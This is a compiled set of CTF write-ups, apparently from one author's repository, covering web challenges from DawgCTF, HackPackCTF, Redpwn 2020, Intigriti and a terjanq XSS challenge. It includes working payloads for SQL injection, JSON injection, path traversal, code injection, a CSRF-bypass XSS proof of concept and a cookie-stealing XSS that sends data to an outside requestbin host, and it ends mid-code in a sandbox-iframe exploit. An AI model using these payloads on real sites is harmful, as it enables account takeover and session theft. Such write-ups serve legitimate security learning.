<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-brunohalltari
description: CTF writeups and security challenges by BrunoHalltari.
---

# Writeups by BrunoHalltari

Source repository: `/repos/BrunoHalltari`

## Repository Index

- CTF-Writeups/README.md
- CTF-Writeups/Intrigriti-marzo2021/Readme.md
- CTF-Writeups/SoXSS-Terjan challenge/readme.md
- CTF-Writeups/challenge-0821.intigriti-August_2021/Readme.md
- CTF-Writeups/challenge-1221.intigriti.io-XMAS/Readme.md
- CTF-Writeups/securityboat-challenge/Readme.md
- CTF-Writeups/https:/challenge-0822.intigriti.io/Readme.md
- CTF-Writeups/XMASTCTF-2020/web/FlagChecker/Readme.md
- CTF-Writeups/Redpwn-2020/Web/Login/Readme.md
- CTF-Writeups/Redpwn-2020/Web/Static-pastebin/Readme.md
- CTF-Writeups/Redpwn-2020/Web/Tux-fanpage/Readme.md
- CTF-Writeups/Redpwn-2020/Web/panda-facts/Readme.md
- CTF-Writeups/HackPackCTF/pwn/jsclean/Readme.md
- CTF-Writeups/HackPackCTF/Web/Cookie Forge/Readme.md
- CTF-Writeups/DawgCTF/Free Wifi/Readme.md
- CTF-Writeups/DawgCTF/My First Pcap/Readme.md
- CTF-Writeups/DawgCTF/Where did the space go?/Readme.md

## Writeup Content


### File: CTF-Writeups/README.md


Here i will post my writeups :)



### File: CTF-Writeups/DawgCTF/Free Wifi/Readme.md

## Free Wifi 1 :

The  challenge featured a pcapng file to download, after checking it for  a while i found a GET request to /staff.html 

![Ricgiesta](https://user-images.githubusercontent.com/59454895/79156182-54ee7180-7dca-11ea-84f4-f4599f7dfe48.PNG)

so i just tried to make a get request to freewifi.ctf.umbccd.io/staff.html and i got the flag  in the main web-page : 

![Prima](https://user-images.githubusercontent.com/59454895/79245164-a7359e00-7e6f-11ea-9bf0-56f45a480e71.PNG)+

Flag: DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}





## Free Wifi 3 :

In this challenge ,to start, i checked a POST request to /forgotpassword.html .
After looking inside the html code of the forgot password page i found something interesting

![Meglio](https://user-images.githubusercontent.com/59454895/79161259-11e4cc00-7dd3-11ea-9787-e99cfbf8438f.PNG)


This is an email value of an ipotetic user of the web site!
Now I just put the email true.grit@umbccd.io inside the text box and I pressed "I forgot my password" Intercepting the request with burp.
It was interesting because in the header i found the email that i used before , but  with the owner's username :D and that's really good.
Why is it good ? 
Because without a proper validation we can manipulate the request header modifying just the email value and leaving the username unchanged , so the website believes we are a legitimate user while an attacker( in this case me  ) could receive the authentic link to change the password.



In the end I changed the email in the request taken with burp with one of my property, leaving the username unchanged. I sent the modified request and received the flag :

![Greve](https://user-images.githubusercontent.com/59454895/79158863-fa0b4900-7dce-11ea-8393-51736cf4aec0.PNG)



## Free Wifi 4 :

On the /staff.html page as well as logging in with a username and password you could use the wifi key,so i decided to look some request on the /staff.html page from the pcapng file.
Looking better i discovered a WifiKey nonce parameter encoded in base64 from the cookies section ( you were also notified that the hashing algorithm for wifikey was sha1)

![Cookie](https://user-images.githubusercontent.com/59454895/79171575-4a43d480-7dea-11ea-8c72-0d5118723279.PNG)

After doing the sha1 of the nonce i noticed that the first eight characters where the same as the login token , here is an example from a previous login (i got it always from the pcapng file provided by the authors of the challenge)

Nonce: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMQ== . with sha1 it becomes 5004f47ae3e2e7c1c9a5ea4d1666f95e6b06b062
Login token (of the same session) : ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4DYg.fnXZhEmbQPzEgFWLgEfjSTeqX2Y&passcode=5004f47a

![Cookie2](https://user-images.githubusercontent.com/59454895/79172677-45345480-7ded-11ea-8307-a4a65f6dbe2f.PNG)
![TokenCsrf](https://user-images.githubusercontent.com/59454895/79172740-6f861200-7ded-11ea-960a-eda5ee154567.PNG)

If you look better the passcode in the token you will notice that it is the same as the first eight characters of the  nonce with the SHA1 (5004f47a).

Now we can be sure that the first 8 characters of the sha1 are used to generate the passcode and finally use  this method to log in with the wifi key :D ! .

To complete this challenge  i made a request from my browser to /staff.html intercepting the request with burp in order to take the wifikey nonce of the session, i did the sha1 of the nonce and I put the first eight characters in the "wifiKey" text box trying to login.

It went well and the web page printed the flag :  DawgCTF{k3y_b@s3d_l0g1n!}


## Free Wifi 2 :

The description of this challenge was " I saw someone's screen and it looked like they stayed logged in, somehow...  " and a pcap file was provided for donwload.

After looking for a while inside the pcapng file i found an  interesting request to /jwtlogin
![token](https://user-images.githubusercontent.com/59454895/79248691-0e555180-7e74-11ea-83c0-4340f2d79920.PNG)

I tried to make a request but all I got was this :

{
    "description": "Request does not contain an access token",
    "error": "Authorization Required",
    "status_code": 401
}
 So i realized that we have  to create a jwt token to get the authorization.

For hours I kept trying to create tokens that used the username field, since in the other challenges I had found an   email "true.grit@umbccd.io" , but nothing... So I tried to log in from /staff.html by inserting in the username field "true.grit@umbccd.io" without putting any password, intercepting the request with burp.

It was the right move because in the header of the error page i found this -----> " JWT 'identity'=31337; Path=/ "  and this is very useful for us because we know that the jwt token is using the identity and username field ( even if they are deprecated ).

To finish this challenge i just went again to /jwtlogin intercepting the request with burp , then i put the token in the header like this:

Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsInVzZXJuYW1lIjoidHJ1ZS5ncml0QHVtYmNjZC5pbyIsImlhdCI6IjE1ODY2OTg2NDYiLCJleHAiOiIxNTg2Njk5NTE3IiwibmJmIjoiMTU4NjY5ODUxNyJ9._eJaJQszRDarG_lY_xu7Yt7nTksNzFiEBE1-N6B5eXY

After i sent the modified request with the jwt token i got the flag :

![ahahahah](https://user-images.githubusercontent.com/59454895/79263641-1d93c980-7e8b-11ea-891c-5c90d1c1c85a.PNG)

Flag: DawgCTF{y0u_d0wn_w!t#_JWT?}









### File: CTF-Writeups/DawgCTF/My First Pcap/Readme.md

## My First Pcap :

 The description of this challenge was "Find the flag in the network traffic” and a .pcap file was provided.
 First of all i checked inside the file the http traffic by implementing the "http" filter on wireshark ,and doing so I found a GET request to /flag.txt.
 Reading the content of the request I found a text encoded in base 64 " RGF3Z0NURntuMWMzX3kwdV9mMHVuZF9tM30=" and when i decoded it i got this : DawgCTF{n1c3_y0u_f0und_m3}.
 
 Flag: DawgCTF{n1c3_y0u_f0und_m3}



### File: CTF-Writeups/DawgCTF/Where did the space go?/Readme.md

## Where did the spaces go? :

In this challenge we just had this code :
-.--.---...--....-.--...-.-----..-...--.---..--...-.--...-...-..-......----..-...-........--.-.-..--..-...-..-......----...--..-...-..-.....-.-.---.-.----.


At first glance it may seem like a morse code , but it is not.
Morse is too variable.  Each character is a different length ,it would have to be brute-forced by hand and that's too much, also there isn't the "DAWGCTF" flag format if we decode from morse.
After that I checked some telegraph codes it turns out to be Baudot .

Baudot is a telegraph code with fixed  length representation for each char , to be more specific a fixed length of 5 bits.
A way to make sure if we are talking about Baudot is to add up all the characters and see if the sum is divisible by five , in this case the given string is 155 chars long , so it's divisible by five .


In the end I used a baudot decoder , but first we have to convert the string into binary , so i thought  " - " meant 0  and the " . " meant 1 obtaining this :
01001000111001111010011101000001101110010001100111010011101110110111111000011011101111111100101011001101110110111111000011100110111011011111010100010100001

Now that i had the binary i converted it with the baudot decoder and i got : DAWGCTFBAUD⇧0⇩T⇧1⇩SN⇧0⇩TM⇧0⇩RSE .

But it was still not the correct flag , i just removed the " ⇧ ⇩ " and the flag  was correct .

Flag: DAWGCTFBAUD0T1SN0TM0RSE



### File: CTF-Writeups/HackPackCTF/Web/Cookie Forge/Readme.md

## Cookie  Forge :

The description of this challenge was :
" Help a new local cookie bakery startup shake down their new online ordering and loyalty rewards portal at https://cookie-forge.cha.hackpack.club!

I wonder if they will sell you a Flask of milk to go with your cookies... "

![bella 5](https://user-images.githubusercontent.com/59454895/85864768-3db60200-b7c5-11ea-952d-4d1f70872df4.PNG)

First of all i tried to go on " Flagship Loyalty " but all i got was this : 

![Noflag](https://user-images.githubusercontent.com/59454895/85865093-aac99780-b7c5-11ea-82b9-5bcfb1a9da42.PNG)

Using burp i managed to intercept a cookie field , also there was a hint about flask in the description and and  a huge cookie on the main page , so i realized they were using flask to generate the token . I used flask-unsign to read the cookie , launching this comand :
" flask-unsign -d -c eyJmbGFnc2hpcCI6ZmFsc2UsInVzZXJuYW1lIjoidGVzdCJ9.Xpn4fg.FHIOgRaiS8-WKoGU1vX5_b9h5q4 " and it gave me {'flagship': False, 'username': 'test'}.

I knew we had to change the flagship value  but every cookie as a session password , i just bruteforced the password using flask-unsign ( the result was " password1" ) and made a cookie where i had this values {'flagship': True , 'username': 'test'} .



To finish this challenge  i encoded my own session with flagship set to True

![CookieToken](https://user-images.githubusercontent.com/59454895/85865297-f8de9b00-b7c5-11ea-9088-dbeb39d9aadc.PNG)

After sending the request with my session i went to Flagship Loyalty and the flag was served :

![bella4](https://user-images.githubusercontent.com/59454895/85866326-82429d00-b7c7-11ea-8aef-d028385476e7.PNG)

Flag: flag{0hmy@ch1ng_p@ncre@5th33$3@r3_d3l1c10$0}



### File: CTF-Writeups/HackPackCTF/pwn/jsclean/Readme.md

## JSCLEAN :

The description of this challenge was :   
"JavaScript Cleaning Service: Transform ugly JavaScript files to pretty clean JavaScript files!".

In the description there was also a python file to download with this code:

```python
import os
import sys
import subprocess


def main(argv):
    print("Welcome To JavaScript Cleaner")
    js_name = input("Enter Js File Name To Clean: ")
    code = input("Submit valid JavaScript Code: ")

    js_name = os.path.basename(js_name) # No Directory Traversal for you

    if not ".js" in js_name:
        print("No a Js File")
        return

    with open(js_name,'w') as fin:
        fin.write(code)

    p = subprocess.run(['/usr/local/bin/node','index.js','-f',js_name],stdout=subprocess.PIPE);
    print(p.stdout.decode('utf-8'))

main(sys.argv)

```

The first thing I tried was to send a random name and some Javascript to see what would have happened. All I got was my Javascript code beautified :

![test](https://user-images.githubusercontent.com/59454895/80551634-09d48100-89bc-11ea-8e5e-8690c86ff36f.PNG)

Looking in the python code i discovered that with the subprocess.run() is executing an external command  where  an "index.js" is taken, so i tried to call the file "index.js"  and put some  javascript, discovering that I had managed to inject it.

![Esorcista](https://user-images.githubusercontent.com/59454895/80551972-22916680-89bd-11ea-9fc4-7ae28fd5e679.PNG)

Now we have just to extract the flag , i did it by injecting this code :
" const fs = require('fs');const a = fs.readFileSync('flag.txt', 'utf8');console.log(a) "

The flag is served :
![Capture](https://user-images.githubusercontent.com/59454895/80552374-5ae57480-89be-11ea-9f4d-7d087fb70550.PNG)

Flag: flag{Js_N3v3R_FuN_2_Re4d}





### File: CTF-Writeups/Intrigriti-marzo2021/Readme.md


## Intigriti — XSS Challenge 

![Capture](https://user-images.githubusercontent.com/59454895/112804703-fff84980-9074-11eb-972e-85a85c837655.PNG)

## Let's start

The challenge website had an input field to enter notes where we could write what we want.
First of all i tried to fuzz in order to see how the challenge would react , the first thing i noticed was a csrf token and our notes in the post request,
i also noticed that if we send a special character to escape the html tag with any strange element it will be sanitized by the server . After a while i
found out that the notes went through htmlspecialchars() function, which should help to prevent xss on this field because it can convert elements like < or > into  HTML entities.

Fortunately during my test i also tried to put an email in the note field ,it  helped me to find a hidden feature (the mailto attribute did not appear with other types of inputs).

![Capture3](https://user-images.githubusercontent.com/59454895/112806481-18696380-9077-11eb-95b0-8221d5b8cc54.PNG)

I tought it was interesting bacause maybe we could escape since the email address appears inside the href attribute of the HTML tag.
I decided to read how "mailto" works from the rfc , and i found out there is a strange way to declare the email with this attribute:
``` "\\\"it's\ ugly\\\""@example.org; ``` .

 It was a very good find , because it could allow to inject javascript between ``` "\\\"it's\ ugly\\\" ```  and ``` "@example.org; ```
  
the final payload was :
``` "\\\"traffik\prova\\\"\ onmouseover=alert('flag{THIS_IS_THE_FLAG}');//"@outlook.it  ```

The following payload breaks out of the attribute and adds an onmouseover event.
![Capture6](https://user-images.githubusercontent.com/59454895/112814874-063ff300-9080-11eb-9319-a2ce218340fb.PNG)


## CSRF Token bypass
The challenge had CSRF token(in this case hashed with MD5) built in. The page generates a token and stores it in a hidden form input.  That's a problem for our final POC because the server ensure that the form hasn’t been submitted by a malicious site thanks to this token , so we need to bypass it. 


First of all i tried to generate an empty csrf token and a csrf token of the same length as the original but nothing worked.
After a while i noticed that there was also a comment with a timestamp and it helped me a lot , because after a research i understood that the token was generated by taking the unix timestamp and hashandled it in md5 , that's not effective as a protection because is easy to predict .


![Capture5](https://user-images.githubusercontent.com/59454895/112812171-15717180-907d-11eb-91a2-a6b0f9df6459.PNG)

So in order to finish the challenge i made a POC where i could send my xss payload inside the notes parameter with the post request thanks to ``` XMLHttpReques ``` ,  to bypass the csrf token i just took the date with ``` Date.now() ``` function in js and hashandled all in md5.
Final POC:

```html
<html>
  <head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
  </head>
  <body>
    <button onclick="Esegui()">Execute Payload</button>
    <script>
        function Esegui() {
          var url = "https://challenge-0321.intigriti.io/";
          var flag = "\ onmouseover=alert('flag{THIS_IS_THE_FLAG}');//"
          var xss_payload = "\\\traffik\prova\\\" + flag + "@outlook.it "

          var d = Date.now().toString().substr(0,10);
          var csrf = CryptoJS.MD5(d).toString();
          var data = "csrf=" + csrf + "&notes=" + xss_payload;

          var request1 = new XMLHttpRequest();
          request1.open("GET",url);
          request1.withCredentials = true;

          request1.onreadystatechange = function () {
            var request2 = new XMLHttpRequest();
            request2.withCredentials = true;
            request2.open("POST", url);
            request2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            request2.send(data);
          }

          request1.send();
        }
    </script>
</body>
</html>
```



### File: CTF-Writeups/Redpwn-2020/Web/Login/Readme.md

## Login :

The description of this challenge was : " I made a cool login page. I bet you can't get in! " and the home page of the website was presented with a login form like this :

![Capture22](https://user-images.githubusercontent.com/59454895/85869348-d8b1da80-b7cb-11ea-9df9-d9bd98fb9e41.PNG)

## Also an index.js was provided for the download :

```javascript
global.__rootdir = __dirname;

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const db = require('better-sqlite3')('db.sqlite3');

require('dotenv').config();

const app = express();

app.use(bodyParser.json({ extended: false }));
app.use(cookieParser());

app.post('/api/flag', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    if (typeof username !== 'string') {
        res.status(400);
        res.end();
        return;
    }
    if (typeof password !== 'string') {
        res.status(400);
        res.end();
        return;
    }

    let result;
    try {
        result = db.prepare(`SELECT * FROM users 
            WHERE username = '${username}'
            AND password = '${password}';`).get();
    } catch (error) {
        res.json({ success: false, error: "There was a problem." });
        res.end();
        return;
    }
    
    if (result) {
        res.json({ success: true, flag: process.env.FLAG });
        res.end();
        return;
    }

    res.json({ success: false, error: "Incorrect username or password." });
});

app.use(express.static(path.join(__dirname, '/public')));

app.listen(process.env.PORT || 3000);

db.prepare(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT);`).run();

db.prepare(`INSERT INTO 
    users (username, password)
    VALUES ('${process.env.USERNAME}', '${process.env.PASSWORD}');`).run();
```
When i had a first look at the code i understood that there was a call to api/flag  with the credentials when we try to login , without any  kind of sanitization . I tried to insert "  admin' or 1=1 --  "  in the username field in order to have a query like this : ``` SELECT * FROM users 
            WHERE username = 'admin' or 1=1 -- '
            AND password = '${password}'; ``` . It worked because in this way i have been validated as the admin without any password thanks to sql comments.
            
            
            
            


![Capture](https://user-images.githubusercontent.com/59454895/85872271-cc2f8100-b7cf-11ea-9ec7-dd6dc83aa37d.PNG)

Flag: flag{0bl1g4t0ry_5ql1}



### File: CTF-Writeups/Redpwn-2020/Web/Static-pastebin/Readme.md

## Static-pastebin :

The description of this challenge was : " I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here "

The home page of the web site was presented like this:

![CaptureVero](https://user-images.githubusercontent.com/59454895/85900597-63acc800-b800-11ea-81fa-4d3b209847fa.PNG)

There was also a way to report a link to the admin:

![OOOOOO](https://user-images.githubusercontent.com/59454895/85901979-344b8a80-b803-11ea-9027-8e13f90dacdc.PNG)


First of all i tried to put <script>alert(1);</script> to see if the site would print the number one but it didn't work and i got this :

![Capture000](https://user-images.githubusercontent.com/59454895/85898838-49251f80-b7fd-11ea-85b8-91c018a2c048.PNG)

 Here i could notice that every post was base64 encoded when i pressed the button create , i got also this confirmation from the code of the site that was dealing the posts , because as we can see there is the btoa function that encodes the text value in base64 :
 
 ```javascript
 (async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const button = document.getElementById('button');
    button.addEventListener('click', () => {
        const text = document.getElementById('text');
        window.location = 'paste/#' + btoa(text.value);
    });
})();
```

After i made the post in the site i looked inside the source again to see how the reading part was handled  and i found some interesting code :
```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}

```
Reading this code i understood two important things , first of all the value from URL is decoded from base64 using the atob function ( It will be useful when i will report the link with the payload) and our input is sanitized with the clean function , looking inside this function i could see that the writing of text was not allowed if the bracket pairs didn't match . I broke this function just adding a > to my payload :
```javascript
test"><img src=x onerror=alert("22");>
```
![Test](https://user-images.githubusercontent.com/59454895/85903016-a45b1000-b805-11ea-8b64-ee6ca162333f.PNG)

Now that I know it works locally I modified my payload in this way :  ``` test"><img src=x onerror=window.location.href='https://en96oi0edd3dm.x.pipedream.net/?a='+document.cookie;>``` . I used a requestbin to intercept the admin's cookies.


The admin needs to visit the link or we can't intercept his cookie, so I encoded all my payload in base 64 and i added it in my link in this way :

https://static-pastebin.2020.redpwnc.tf/paste/#dGVzdCI+PGltZyBzcmM9eCBvbmVycm9yPXdpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL2VuOTZvaTBlZGQzZG0ueC5waXBlZHJlYW0ubmV0Lz9hPScrZG9jdW1lbnQuY29va2llOz4=

The final step was to report this entire link to the admin and check the requestbin  :

![FlagStaticBin](https://user-images.githubusercontent.com/59454895/85904268-87740c00-b808-11ea-8c5e-bf24dc24d7a4.PNG)

Flag: flag{54n1t1z4t10n_k1nd4_h4rd}




### File: CTF-Writeups/Redpwn-2020/Web/Tux-fanpage/Readme.md

## Tux-fanpage :

The description of this challenge was : " My friend made a fanpage for Tux , can you steal the source code for me? " and the home page was presented like this :

![Capture](https://user-images.githubusercontent.com/59454895/85960368-567c0e80-b9a3-11ea-9c0e-7f4cf8068294.PNG)

The source code of the server is as follows:

const express = require('express')
const path = require('path')
const app = express()

//Don't forget to redact from published source
const flag = '[REDACTED]'

app.get('/', (req, res) => {
    res.redirect('/page?path=index.html')
})

app.get('/page', (req, res) => {

    let path = req.query.path

    //Handle queryless request
    if(!path || !strip(path)){
        res.redirect('/page?path=index.html')
        return
    }
    path = strip(path)

    path = preventTraversal(path)

    res.sendFile(prepare(path), (err) => {
        if(err){
            if (! res.headersSent) {
                try {
                    res.send(strip(req.query.path) + ' not found')
                } catch {
                    res.end()
                }
            }
        }
    })
})

//Prevent directory traversal attack
function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}

//Get absolute path from relative path
function prepare(dir){
    return path.resolve('./public/' + dir)
}

//Strip leading characters
function strip(dir){
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0])){
        if(dir.length > 0){
            return strip(dir.slice(1))
        }
        return ''
    }

    return dir
}

app.listen(3000, () => {
    console.log('listening on 0.0.0.0:3000')
})
The qs package is used by express to parse the request params. This package can also accept arrays from the request params if they are passed as follows:

https://mysite.tld/route?param[]=1&param[]=2
This treats param as an array [1,2]. We can use this property to exploit this website.

Upon analysis, we see that the page is the accepted from the query, hence passing something like ../index.js will give us the source code which has the flag. But here's the catch. There are 2 functions which prevent anything of this sort. First, the strip function removes characters from the start of the string until it matches the regex /^[a-z0-9]$/im. However, if the start of the string matches this regex, it will not check any further. This prevents us from having absolute paths like /etc/passwd or paths starting with ../ in the page param.

The second function which we need to bypass is the preventTraversal function, which recursively removes all instances of ../ from your string.

Now, let's analyze what happens if we pass an array as the page param.

First, we encounter the strip function.

const regex = /^[a-z0-9]$/im

//Remove first character if not alphanumeric
if(!regex.test(dir[0])){
    if(dir.length > 0){
        return strip(dir.slice(1))
    }
    return ''
}

return dir
This takes the parameter dir (which is page, basically), and matches the first index with the regex. However, since page and hence dir is now an array, it will just check the first element of the array. We want dir to be returned as is, so the first element of the array has to match that regex. Our payload so far is:

https://tux-fanpage.2020.redpwnc.tf/?page[]=a
We get back the same path from the strip function, so now we have to bypass the preventTraversal function.

path = strip(path) // returns same path if path[0]='a'

path = preventTraversal(path)
The preventTraversal function looks like:

function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}
In case dir is a string, it checks if the string has ../ in it, and removes every instance of it, recursively. Now, since dir is an array, dir.includes('../) will match only if an element of the array is exactly ../. So we are now free to do ../something, because that does not match ../ exactly. So, we can update our payload:

https://tux-fanpage.2020.redpwnc.tf/?page[]=a&page[]=../something
Now let's figure out what the something is going to be. So, the page is actually loaded in the following code snippet:

res.sendFile(prepare(path), (err) => {
    if(err){
        if (! res.headersSent) {
            try {
                res.send(strip(req.query.path) + ' not found')
            } catch {
                res.end()
            }
        }
    }
})
The path of the file is obtained using the prepare function, let's check that out.

function prepare(dir){
    return path.resolve('./public/' + dir)
}
Okay, so here's a problem. dir is an array, can we add an array to a string? Well, apparently you can, in javascript.

> 'hello'+[1,2,3]
"hello1,2,3"
So it just concatenates the comma separated array to the end of the string. That's really useful for this challenge! Now, we have to think of an array of dir so that path.resolve('./public/' + dir) returns ./index.html, keeping in mind the previous things we established.

> dir = ['a', '/../../index.js']
> './public/' + dir
"./public/a,/../../index.js"
When you pass this string to path.resolve(), it resolves it to ./index.js (It does not matter if the directory a, does not exist, path.resolve() does not care). Great! We've found our payload.

https://tux-fanpage.2020.redpwnc.tf/page?path[]=a&path[]=/../../index.js
This returns the source code. The flag is:

flag{tr4v3rsal_Tim3}



### File: CTF-Writeups/Redpwn-2020/Web/panda-facts/Readme.md

## panda-facts :

The description of this challenge was " I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down! " and the home page of the website was presented with a login form like this :

![Capture](https://user-images.githubusercontent.com/59454895/85876753-79a59300-b7d6-11ea-9bba-550b1ea16fd0.PNG)

## Also an index.js was provided for the download :

```javascript
global.__rootdir = __dirname;

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

require('dotenv').config();

const INTEGRITY = '12370cc0f387730fb3f273e4d46a94e5';

const app = express();

app.use(bodyParser.json({ extended: false }));
app.use(cookieParser());

app.post('/api/login', async (req, res) => {
    if (!req.body.username || typeof req.body.username !== 'string') {
        res.status(400);
        res.end();
        return;
    }
    res.json({'token': await generateToken(req.body.username)});
    res.end;
});

app.get('/api/validate', async (req, res) => {
    if (!req.cookies.token || typeof req.cookies.token !== 'string') {
        res.json({success: false, error: 'Invalid token'});
        res.end();
        return;
    }

    const result = await decodeToken(req.cookies.token);
    if (!result) {
        res.json({success: false, error: 'Invalid token'});
        res.end();
        return;
    }

    res.json({success: true, token: result});
});

app.get('/api/flag', async (req, res) => {
    if (!req.cookies.token || typeof req.cookies.token !== 'string') {
        res.json({success: false, error: 'Invalid token'});
        res.end();
        return;
    }

    const result = await decodeToken(req.cookies.token);
    if (!result) {
        res.json({success: false, error: 'Invalid token'});
        res.end();
        return;
    }

    if (!result.member) {
        res.json({success: false, error: 'You are not a member'});
        res.end();
        return;
    }

    res.json({success: true, flag: process.env.FLAG});
});

app.use(express.static(path.join(__dirname, '/public')));

app.listen(process.env.PORT || 3000);

async function generateToken(username) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    
    const iv = Buffer.alloc(16, 0);

    const cipher = crypto.createCipheriv(algorithm, key, iv);

    const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`

    let encrypted = '';
    encrypted += cipher.update(token, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}

async function decodeToken(encrypted) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    
    const iv = Buffer.alloc(16, 0);
    const decipher = crypto.createDecipheriv(algorithm, key, iv);

    let decrypted = '';

    try {
        decrypted += decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
    } catch (error) {
        return false;
    }

    let res;
    try {
        res = JSON.parse(decrypted);
    } catch (error) {
        console.log(error);
        return false;
    }

    if (res.integrity !== INTEGRITY) {
        return false;
    }

    return res;
}



```
After the login i got a page like this :

![Home](https://user-images.githubusercontent.com/59454895/85878713-72cc4f80-b7d9-11ea-9a45-15a1d9a41b40.PNG)

I Tried to click on the button but i got an error message because i wasn't a member , after looking a while i realized there was a route to api/validate , so i just went to https://panda-facts.2020.redpwnc.tf/api/validate in order to see how the token was generated :

![Capture888888](https://user-images.githubusercontent.com/59454895/85879097-0dc52980-b7da-11ea-8a84-f5bf5b54fbd5.PNG)


Now I knew i had to change the member value , looking the code i saw that the token was crypted with aes-192-cbc and encoded in base64, so my first tought was to make a token with member : 1 , encrypting it and  encoding the result in base64 to inject the token into the http header but  i couldn't do it because i didn't had the key.

Watching the code again and again  realized that the token was made in this way :
```javascript  
const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}` 
```
Here we can do a JSON injection because the username is not validated , so i just injected ' prova","member":1,"username":"prova ' in the usename field to get a token like this:

{"integrity":"12370cc0f387730fb3f273e4d46a94e5","member":0,"username":"prova","member":1,"username":"prova"}

After entering overloading the JSON syntax i pressed the button and got the flag :

![dd](https://user-images.githubusercontent.com/59454895/85880771-e0c64600-b7dc-11ea-85be-31ed5ec0c1a9.PNG)

Flag: flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}





### File: CTF-Writeups/SoXSS-Terjan challenge/readme.md

## soXSS

![2022-04-07_01-54](https://user-images.githubusercontent.com/59454895/162093274-f54f182c-1dae-4f29-98ce-a7e1792f40fd.png)

## Let's begin

The first thing that can be noticed in the challenge is the use of post-messages and also the use of dompurify ( The latest version of the library was in use, so we couldn't bypass DomPurify without having a 0day ), as you can see from this screen:

![2022-04-07_02-01](https://user-images.githubusercontent.com/59454895/162093835-fd21e646-42a8-4395-b241-62196c4346ec.png)


Furthermore, at the following link (https://so-xss.terjanq.me/iframe.php/?source) it is possible to notice another part of the code, here the goal is very straightforward, the highlighted condition needs to be bypassed in order to reach the sink and execute XSS.

![2022-04-07_02-07](https://user-images.githubusercontent.com/59454895/162094500-690c045b-eaf3-44e0-bee3-82b866bf9d34.png)

The functioning of this part of the code is very clear, a listener event was used in order to check that the source and the identifier are not different, it's also important to say that the identifier is stored in an user's session.

First of all it was necessary to find a way to bypass this check ```e.origin !== window.origin```, After hitting my head a bit I found this thread on StackOverflow that really helped me a lot (https://stackoverflow.com/questions/55451493/what-is-window-origin,  https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox), apparently if we embed the iframe via ```<iframe src="https://so-xss.terjanq.me/iframe.php" sandbox>``` we can force the ```null``` origin.

Now another problem arises, as the page cannot be embedded inside an iframe because there was the flag ```X-Frame-Options: SAMEORIGIN```. It means that the page can only be displayed in a frame on the same origin as the page itself. 

### There is still hope

One important feature proved very important to overcome this problem, all windows opened from sandbox iframe inherit the sandbox flag, as documentated here: https://www.w3.org/TR/2010/WD-html5-20100624/the-iframe-element.html.
It means that we don't need to put the page inside an iframe, we can just created a sandbox iframe and use ```window.open``` inside it, like this:
```javascript
<iframe id=f sandbox="allow-scripts allow-top-navigation allow-forms allow-modals allow-popups" srcdoc="<button onclick=run()>click me 1</button><script>
  function run() {
    var win = window.open('https://so-xss.terjanq.me/iframe.php')
    setTimeout(() => {
      win.postMessage({
            identifier: 'abc',
            type: 'render',
            body: `<img src=x onerror=opener.top.postMessage({identifier},'*')>`,
        }, '*');
    }, 2000)
  }
</script>"></iframe>
```
In this way the newly opened window inherit the sandbox flag and his origin will become null. Just to be more clear, it means that the iframe with the ```sandbox``` attribute and the window for iframe.php (which is accessible by the variable win) share the same origin null.
Now another issue appears, The page on iframe.php has the origin "null", so we can't access any resources on the origin ```so-xss.terjanq.me``` and the rules says that we need to execute xss on that origin.

This is where the parameter ```identifier``` comes into play, because it's possible to open ```https://so-xss.terjanq.me/iframe.php``` and send XSS with stolen identifier so the origin is ```so-xss.terjanq.me```.

This is the final poc :
```javascript
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>test</title>
  </head>
  <body>
    <iframe id=f sandbox="allow-scripts allow-top-navigation allow-forms allow-modals allow-popups" srcdoc="<button onclick=run()>click me 1</button><script>
      function run() {
